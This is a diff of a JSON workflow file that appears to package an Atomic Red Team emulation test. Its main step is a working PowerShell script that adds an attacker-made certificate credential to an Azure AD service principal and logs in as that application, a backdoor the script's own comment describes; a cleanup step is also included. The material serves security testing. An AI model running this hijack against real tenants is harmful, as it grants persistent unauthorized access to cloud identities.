@@ -7,87 +7,87 @@
   ],
   "steps": [
     {
-      "id": "bf32705a-5175-44da-b7aa-5702bbeff424",
+      "id": "6e8d0201-1224-4688-95fe-1d4f2b28c201",
       "type": "execute-command",
       "data": {
-        "command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential \u003e $null\n\n$sp = Get-AzureADServicePrincipal -SearchString \"#{service_principal_name}\" | Select-Object -First 1\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\n$credNotAfter = (Get-Date).AddDays(1)\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\n\n$cert = New-SelfSignedCertificate -DnsName \"atomicredteam.example.com\" -FriendlyName \"AtomicCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\n\nNew-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"AtomicTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\n\nStart-Sleep -s 30\n$tenant = Get-AzureADTenantDetail\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\nWrite-Host \"End of Hijacking\"\n",
+        "command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential \u003e $null\n\n$sp = Get-AzureADServicePrincipal -SearchString \"#{service_principal_name}\" | Select-Object -First 1\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\n$credNotAfter = (Get-Date).AddDays(1)\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\n\n$cert = New-SelfSignedCertificate -DnsName \"atomicredteam.example.com\" -FriendlyName \"AtomicCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\n\nNew-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"AtomicTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\n\nStart-Sleep -s 30\n$tenant = Get-AzureADTenantDetail\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\nWrite-Host \"End of Hijacking\"",
         "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "8d792ea7-99bc-4a2f-be49-91c49d51630d",
+      "id": "fc9d1f11-b676-42c3-9f04-59dbde4f8c7f",
       "type": "execute-command",
       "data": {
-        "command": "Import-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential -ErrorAction Ignore \u003e $null\n\n$sp = Get-AzureADServicePrincipal -SearchString \"#{service_principal_name}\" | Select-Object -First 1\n$credz = Get-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId\nforeach ($cred in $credz) {\n  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier) -eq \"AtomicTest\") {\n    Write-Host \"Removed $($cred.KeyId) key from SP\"\n    Remove-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -KeyId $cred.KeyId\n  }  \n}\nGet-ChildItem -Path Cert:\\CurrentUser\\My | where { $_.FriendlyName -eq \"AtomicCert\" } | Remove-Item\n",
+        "command": "Import-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential -ErrorAction Ignore \u003e $null\n\n$sp = Get-AzureADServicePrincipal -SearchString \"#{service_principal_name}\" | Select-Object -First 1\n$credz = Get-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId\nforeach ($cred in $credz) {\n  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier) -eq \"AtomicTest\") {\n    Write-Host \"Removed $($cred.KeyId) key from SP\"\n    Remove-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -KeyId $cred.KeyId\n  }  \n}\nGet-ChildItem -Path Cert:\\CurrentUser\\My | where { $_.FriendlyName -eq \"AtomicCert\" } | Remove-Item",
         "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "ffa89426-0d0d-483b-ad14-52b30d977584",
+      "id": "459876a9-7456-4149-ab50-88ecf9c21d22",
       "name": "Check dependency 1/1",
       "description": "AzureAD module must be installed.\n",
       "type": "execute-command",
       "data": {
-        "command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
-        "command_type": ""
+        "command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}",
+        "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "f7170220-a651-4e9f-a092-26981b479b5f",
+      "id": "23988b53-f315-4139-bc16-1fe99b1d47d0",
       "name": "Resolve dependency 1/1",
       "description": "AzureAD module must be installed.\n",
       "type": "execute-command",
       "data": {
-        "command": "Install-Module -Name AzureAD -Force\n",
-        "command_type": ""
+        "command": "Install-Module -Name AzureAD -Force",
+        "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "5ebf15be-4c87-4706-8fd0-f2864b901bfa",
+      "id": "3baa7ac5-820e-43e4-8578-7c358b0aa5ab",
       "name": "Re-check dependency 1/1",
       "description": "AzureAD module must be installed.\n",
       "type": "execute-command",
       "data": {
-        "command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
-        "command_type": ""
+        "command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}",
+        "command_type": "powershell"
       },
       "elevation_required": false
     }
   ],
   "flows": [
     {
-      "s": "bf32705a-5175-44da-b7aa-5702bbeff424",
+      "s": "6e8d0201-1224-4688-95fe-1d4f2b28c201",
       "p": "on-success",
-      "o": "8d792ea7-99bc-4a2f-be49-91c49d51630d"
+      "o": "fc9d1f11-b676-42c3-9f04-59dbde4f8c7f"
     },
     {
-      "s": "bf32705a-5175-44da-b7aa-5702bbeff424",
+      "s": "6e8d0201-1224-4688-95fe-1d4f2b28c201",
       "p": "on-failure",
-      "o": "8d792ea7-99bc-4a2f-be49-91c49d51630d"
+      "o": "fc9d1f11-b676-42c3-9f04-59dbde4f8c7f"
     },
     {
-      "s": "ffa89426-0d0d-483b-ad14-52b30d977584",
+      "s": "459876a9-7456-4149-ab50-88ecf9c21d22",
       "p": "on-success",
-      "o": "bf32705a-5175-44da-b7aa-5702bbeff424"
+      "o": "6e8d0201-1224-4688-95fe-1d4f2b28c201"
     },
     {
-      "s": "ffa89426-0d0d-483b-ad14-52b30d977584",
+      "s": "459876a9-7456-4149-ab50-88ecf9c21d22",
       "p": "on-failure",
-      "o": "f7170220-a651-4e9f-a092-26981b479b5f"
+      "o": "23988b53-f315-4139-bc16-1fe99b1d47d0"
     },
     {
-      "s": "f7170220-a651-4e9f-a092-26981b479b5f",
+      "s": "23988b53-f315-4139-bc16-1fe99b1d47d0",
       "p": "on-success",
-      "o": "5ebf15be-4c87-4706-8fd0-f2864b901bfa"
+      "o": "3baa7ac5-820e-43e4-8578-7c358b0aa5ab"
     },
     {
-      "s": "5ebf15be-4c87-4706-8fd0-f2864b901bfa",
+      "s": "3baa7ac5-820e-43e4-8578-7c358b0aa5ab",
       "p": "on-failure",
-      "o": "bf32705a-5175-44da-b7aa-5702bbeff424"
+      "o": "6e8d0201-1224-4688-95fe-1d4f2b28c201"
     }
   ],
   "tags": [
